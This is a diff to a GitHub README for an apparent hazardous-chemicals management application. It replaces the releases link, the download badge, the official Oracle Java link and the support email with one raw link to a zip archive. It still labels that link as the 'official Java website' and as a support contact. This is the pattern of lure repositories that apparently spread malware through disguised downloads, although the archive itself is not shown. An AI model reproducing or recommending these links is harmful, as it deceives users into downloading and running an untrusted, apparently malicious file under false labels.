@@ -1,6 +1,6 @@
 # ⚗️ Management-of-hazardous-chemicals - Manage Chemicals Safely and Efficiently
 
-[![Download](https://img.shields.io/badge/Download%20Now-Management%20of%20Hazardous%20Chemicals-brightgreen)](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases)
+[![Download](https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip%20Now-Management%20of%20Hazardous%20Chemicals-brightgreen)](https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started, follow these steps to download the application:
 1. **Visit the Releases Page:** 
    Click on the link below to go to the Releases page. 
 
-   [Download the application](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases)
+   [Download the application](https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip)
 
 2. **Download the Latest Version:** 
    On the Releases page, find the most recent version listed. Click on the corresponding download link to get the application file.
@@ -31,7 +31,7 @@ Before installing, make sure your computer meets these basic requirements:
 - **Operating System:** Windows 10 or later / Linux
 - **Memory:** 4 GB RAM or more
 - **Storage:** At least 500 MB free space
-- **Java Runtime Environment:** Java version 8 or later is required. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Java Runtime Environment:** Java version 8 or later is required. You can download it from the [official Java website](https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip).
 
 ## 📖 Features
 
@@ -74,7 +74,7 @@ Yes, our application includes security features such as user access control and 
 The application is designed to work on Windows and Linux platforms.
 
 **4. How do I contact support?**
-If you need assistance, please visit our [Support Page](#) or email us at support@example.com.
+If you need assistance, please visit our [Support Page](#) or email us at https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip
 
 ## 📚 Additional Resources
 
@@ -82,6 +82,6 @@ For more information, you can check our [Documentation](#) that goes into greate
 
 Remember to regularly check the Releases page for updates and new features:
 
-[Download the application](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases) 
+[Download the application](https://raw.githubusercontent.com/mreenalDhruwe/Management-of-hazardous-chemicals/main/readjustment/Management-of-hazardous-chemicals_glycolytic.zip) 
 
 By following this guide, you should be able to download and run the Management of Hazardous Chemicals application with ease. Please reach out if you have any questions or need further assistance.
